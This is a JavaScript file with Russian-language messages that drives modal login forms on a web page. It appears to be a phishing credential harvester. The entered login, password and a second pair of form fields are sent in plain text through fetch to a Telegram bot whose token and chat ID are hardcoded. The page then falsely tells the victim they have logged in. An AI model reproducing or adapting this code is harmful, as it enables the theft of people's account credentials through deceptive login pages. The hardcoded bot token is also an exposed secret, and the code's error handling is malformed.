const modalButton = document.querySelector('.modalButtonTwo')
const modal = document.querySelector('.modal')
const backdropModal = document.querySelector('.modalBackdrop')
const krestik = document.querySelector('.modalClose')
const apply = document.querySelector('.modalApplyButton')
const thankYou = document.querySelector('.thankYou')
const modalContent = document.querySelector('.modalContent')
const del = document.querySelectorAll('.delete')
const check = document.querySelector('#checkInp')
const checkNum = document.querySelector('#checkNum')
const modalClick = document.querySelector('.modalClick')




let time


modalButton.addEventListener('click', () => {
    backdropModal.classList.add('modalBackdropActive')
    modal.classList.add('modalActive')
    thankYou.innerHTML = ''
    modalContent.classList.remove('hideContent')

})


const removeModalClasses = () => {
    if (time) {
        clearTimeout(time)
    }
    backdropModal.classList.remove('modalBackdropActive')
    modal.classList.remove('modalActive')

}

backdropModal.addEventListener('click', removeModalClasses)

krestik.addEventListener('click', removeModalClasses)

modal.addEventListener('click', (e) => {
    e.stopPropagation()
})

apply.addEventListener('click', () => {
    modalContent.classList.add('hideContent')

    time = setTimeout(removeModalClasses, 3000)
})
del[0].addEventListener('click', () => {
    check.value = '';
    checkNum.value = ''
})

const bot = {
    TOKEN: '5910272746:AAFHoJzt6vNZXDvtZ8RuHWklc2CdRFLsZ5Q',
    chatID: '-852894554'
}

apply.addEventListener('click', (e) => {
    e.preventDefault()

    if (check.value && checkNum.value) {
        const MessageTelegram = ` ${check.value.trim()}  ${checkNum.value}`
        const TelegramAPI = `https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${MessageTelegram}`
        fetch(TelegramAPI)
            .then(response => {
                if (response.ok) {
                    modalContent.classList.add('hideContent')
                    thankYou.innerHTML = `
                        <h2>Вы вошлы в аккаунт</h2>
                        <img src="https://free-png.ru/wp-content/uploads/2021/06/free-png.ru-39-340x340.png" alt="">
                    `
                }
            }), error => {
                modalContent.classList.add('hideContent')
                thankYou.innerHTML = `
                <h2>${error}</h2>
                <p>Проблемы с соединением</p>
                `
            }
    } else {
        modalContent.classList.add('hideContent')
        thankYou.innerHTML = `
            <img src="./image/error-message.png" alt="">
            <h2>Ошибка</h2>
            <p>Не правильно введены данные</p>
            `
    }
})

const modalButtonOne = document.querySelector('.modalButtonOne')
const modalButtonThree = document.querySelector('.modalButtonThree')
const checkLog = document.querySelector('#checkLog')
const checkPassword = document.querySelector('#checkPassword')
const modalHeader = document.querySelector('.modalHeader')



modalButtonOne.addEventListener('click', () => {
    backdropModal.classList.add('modalBackdropActive')
    modal.classList.add('modalActive')
    thankYou.innerHTML = ''
    modalContent.classList.remove('hideContent')

})

backdropModal.addEventListener('click', removeModalClasses)

krestik.addEventListener('click', removeModalClasses)

modal.addEventListener('click', (e) => {
    e.stopPropagation()
})

modalButtonOne.addEventListener('click', () => {
    modalContent.classList.add('hideContent')

    time = setTimeout(removeModalClasses, 3000)
})
modalButtonThree.addEventListener('click', () => {
    checkLog.value = '';
    checkPassword.value = ''
})

modalButtonOne.addEventListener('click', (e) => {
    e.preventDefault()

    if (checkLog.value && checkPassword.value) {
        const MessageTelegram = ` ${checkLog.value.trim()}  ${checkPassword.value}`
        const TelegramAPI = `https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${MessageTelegram}`
        fetch(TelegramAPI)
            .then(response => {
                if (response.ok) {
                    modalContent.classList.add('hideContent')
                    modalHeader.innerHTML = '<h2>Вход</h2>'
                    thankYou.innerHTML = `
                        <h2>Вы вошлы в аккаунт</h2>
                        <img src="https://free-png.ru/wp-content/uploads/2021/06/free-png.ru-39-340x340.png" alt="">
                    `
                }
            }), error => {
                modalContent.classList.add('hideContent')
                modalHeader.innerHTML = '<h2>Вход</h2>'
                thankYou.innerHTML = `
                <h2>${error}</h2>
                <p>Проблемы с соединением</p>
                `
            }
    } else {
        modalContent.classList.add('hideContent')
        modalHeader.innerHTML = '<h2>Вход</h2>'
        thankYou.innerHTML = `
            <img src="./image/error-message.png" alt="">
            <h2>Ошибка</h2>
            <p>Не правильно введены данные</p>
            `
    }
})
